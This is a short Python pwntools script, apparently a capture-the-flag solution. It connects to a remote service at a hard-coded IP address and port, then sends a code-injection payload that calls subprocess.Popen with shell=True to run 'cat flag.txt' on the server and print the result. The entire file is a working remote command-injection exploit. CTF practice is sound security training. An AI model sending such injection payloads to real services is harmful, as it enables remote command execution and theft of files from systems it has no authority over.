from pwn import *

#nc 103.250.10.198 10011
p = remote("103.250.10.198", 10011)

print(p.recv())
p.sendline(b'subprocess.Popen("cat flag.txt", shell=True)')
print(p.recvline())
flag = p.recvline()
print(flag)
p.close()